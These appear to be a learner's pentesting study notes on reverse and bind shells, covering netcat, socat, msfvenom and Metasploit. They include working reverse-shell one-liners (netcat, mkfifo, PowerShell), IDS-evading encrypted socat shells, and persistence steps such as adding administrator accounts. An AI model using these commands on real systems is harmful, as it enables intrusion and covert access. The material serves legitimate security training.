What is a shell? 

In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. 

reverse and bind shell: 

In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).

------

Tools : 

There are a variety of tools that we will be using to receive reverse shells and to send bind shells. they will act as a interface for us to control target . 

1. Netcat : 

		Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions

		it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system.

		these shells can sometimes be very unstable.

2. Socat : 

		Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat

		whereas its syntax is a bit difficult than netcat 

		and it is not widely installed on every system 

3. Metasploit -- multi/handler:

		The auxiliary/multi/handler module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.

		and it also has wide variety of options to improve the caught shell

4. Msfvenom:

		Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool.

		Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells

some extra resources : 

		1. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

		2. https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

		3. https://github.com/danielmiessler/SecLists

-----

Types of shells  :

1. Reverse Shell: 

		in these type of connections the target tries to connect back to us on a port where we will be listening for connections 

		these shells can bypass firewalls as not extra port is being opened on the target 

		we will have to configure our network correctly so that the target can connect back to us 

		example : 

			setting up a listener port - <nc -nlvp 6969>

			on the target - <nc "attacker_ip" "attacker's port" -e /bin/bash>

2. Bind Shell: 

		in these type of connection target sets us a listening port for us where we connect to gain a shell

		these shells can easily be blocked by firewalls as arbitrary opened ports are blocked by firewall

		we do not need to configure our network for listening as we are the one initiating the connection 

		example : 

				on target machine set up a listener - <nc -lnvp "port" -e cmd.exe>

				connecting from attacker's machine <nc "target_ip" "target's port">

furtheremore these shells can be divided into two categories - 

		1. interactive shells - These allow you to interact with programs after executing them.

		2. non-interactive shells - In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, 


---------


Netcat : 

Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking

The syntax for starting a netcat listener using Linux is this:

	nc -lvnp <port-number>

	-l is used to tell netcat that this will be a listener

	-v is used to request a verbose output

	-n tells netcat not to resolve host names or use DNS

	-p -p indicates that the port specification will follow.

you can use any port as you please until and unless it is free and not being used by anyone else.

using well known ports as a listener can be good as they can bypass firewall rules . 


we can also use netcat to connect to a target by : 

nc "target_ip" "target_port"

------

Netcat Shell Stablisation : 

okay so now you have got a shell , now whatt? 

answere is stablization


Technique 1: Python

		The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

		1. "  python -c 'import pty;pty.spawn("/bin/bash")'  " 	it will spawn a better featured bash shell 

				if it does not work use python2 or python3 instead 

		2. Step two is: "  export TERM=xterm  "  -- this will give us access to term commands such as clear.

		3. Finally (and most importantly) we will background the shell using Ctrl + Z. 
		
		Back in our own terminal we use "  stty raw -echo; fg  ". 
		
		This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). 
		
		It then foregrounds the shell, thus completing the process.

		Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

Technique 2: rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell

To use rlwrap, we invoke a slightly different listener:

	"  rlwrap nc -lvnp <port>  "

	Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise

	background the shell with Ctrl + Z, then use "  stty raw -echo; fg  " to stabilise and re-enter the shell.

Technique 3 : socat 

		easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell.

		limited to linux 

		first we transfer socat static compiled binary to the target using apache/python server and wget 

		for windows file transfer Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

		With any of the above techniques, it's useful to be able to change your terminal tty size.

		 it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

		  run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:

		  Next, in your reverse/bind shell, type in:

		stty rows <number>

		and

		stty cols <number>

		Filling in the numbers you got from running the command in your own terminal.


--------

Socat Continued : 

The easiest way to think about socat is as a connector between two points.

it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

Once again, let's start with reverse shells.

Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

" socat TCP-L:<port> - "

Bind Shells

On a Linux target we would use the following command:

socat TCP-L:<PORT> EXEC:"bash -li"

On a Windows target we would use this command for our listener:

socat TCP-L:<PORT> EXEC:powershell.exe,pipes

	We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

socat TCP:<TARGET-IP>:<TARGET-PORT> -



socat is very good for linux reverse shells that are fully stablized 

socat TCP-L:<port> FILE:`tty`,raw,echo=0   // use this for fully stablized shell

	target must have socat installed or we can even transfer a socat precompiled binary 


The special command is as follows:

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

	This is a handful, so let's break it down.


	first part is easy -- we're linking up with the listener running on our own machine

	 The second part of the command creates an interactive bash session with  EXEC:"bash -li"

	 We're also passing the arguments: pty, stderr, sigint, setsid and sane:


	 		pty, allocates a pseudoterminal on the target -- part of the stabilisation process
			
			stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
			
			sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
			
			setsid, creates the process in a new session
			
			sane, stabilises the terminal, attempting to "normalise" it.

--------

socat encrypted shells : 

One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

tcp should be replaced with openssl in commands ,

first ,  a certificate is generated to use for encryption 

openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt


then merge this shell.key and shell.crt 

cat shell.key shell.crt > shell.pem

into a shell.pem file 

then setup  a listener : 

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -


verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.

To connect back, we would use:

socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

The same technique would apply for a bind shell:

Target:

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

Attacker:

socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

----------

her are some payloads related to netcat and all 

-e option is used to execute a process on connection 

in case of windows use nc static binary 

For example, as a listener:

nc -lvnp <PORT> -e /bin/bash

	for a reverse shell, connecting back with nc <LOCAL-IP> <PORT> -e /bin/bash would result in a reverse shell on the target.

use this if -e option is not available on nc on your or target system 

mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

In order to use this, we need to replace "<IP>" and "<port>" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:


resource: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


--------

Msfvenom: 
---------

Msfvenom: the one-stop-shop for all things payload related.

Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. 

it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py

The standard syntax for msfvenom is as follows:

msfvenom -p <PAYLOAD> <OPTIONS>

		For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

		msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

-f <format>
Specifies the output format. In this case that is an executable (exe)

-o <file>
The output location and filename for the generated payload.

LHOST <ip>

ip to connect back to 

LPORT <port>

port to connect back to 

----

staged and stageless payload 

1. staged 

sent in two parts

it connects back to listener , it does not have reverse shell code in itself . it connects back to get the real payload and executing it directly without storing it on disk

2. stageless

all of the shellcode is sent in one go and it directly sends us back the shell super simple

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. 

Meterpreter
----------

 Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell

 meterpreter shells only work with metasploit 



Payload Naming Conventions

<OS>/<arch>/<payload>

	example : linux/x86/shell_reverse_tcp

	This would generate a stageless reverse shell for an x86 Linux target.

in 32 bit target arch is not to be specified

stageless payload are denoted by underscores " _ "  : shell_reverse_tcp

staged payload have forward slashes "/" : windows/x64/meterpreter/reverse_tcp

msfvenom --list payloads : to list all msfvenom payloads and use grep with it as per your requirement 

---------

Metasploit : multi/handler

1. open msfconsole 

2. use multi/handler

3. show options 

4. set : 	set PAYLOAD <payload>
			set LHOST <listen-address>
			set LPORT <listen-port>

5. "exploit" to start the listener , use -j to background it 

use sessions -i to interact with a session 

--------

Webshells : 


There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a webshell.

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.


resource : https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

---------

got a shell , what next 

 SSH keys stored at /home/<user>/.ssh are often an ideal way to do this. use ssh private keys to have better persistence over taget 

 	 Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods

The syntax for this is as follows:

net user <username> <password> /add

net localgroup administrators <username> /add

The important take away from this is:

Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.

---------






	

